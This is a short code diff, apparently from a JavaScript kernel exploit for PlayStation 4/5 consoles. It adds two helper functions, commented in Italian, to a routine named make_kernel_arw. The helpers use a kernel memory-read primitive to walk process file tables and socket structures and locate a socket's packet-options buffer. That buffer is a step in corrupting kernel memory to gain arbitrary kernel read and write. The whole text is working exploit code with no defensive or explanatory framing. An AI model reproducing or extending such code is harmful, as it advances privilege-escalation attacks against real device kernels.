@@ -1177,6 +1177,24 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     const tclass = new Word();
     const off_tclass = is_ps4 ? 0xb0 : 0xc0;
 
+/** Restituisce f_data (struct socket*) a partire dal FD */
+function get_fd_data_addr(sock, read_fn) {
+  const fdesc = kernel.addr.curproc
+              + CURPROC_OFILES
+              + BigInt(sock) * BigInt(SIZEOF_OFILES);
+  const filep = read_fn(fdesc);
+  return read_fn(filep);
+}
+
+/** Restituisce inp_pktopts per un dato socket */
+function get_sock_pktopts(sock, read_fn) {
+  const sock_data = get_fd_data_addr(sock, read_fn);
+  const pcb       = read_fn(sock_data + BigInt(SO_PCB));
+  return read_fn(pcb + BigInt(INPCB_PKTOPTS));
+}
+
+    
+
     const pktopts = new Buffer(0x100);
     const rsize = build_rthdr(pktopts, pktopts.size);
     const pktinfo_p = k100_addr.add(0x10);
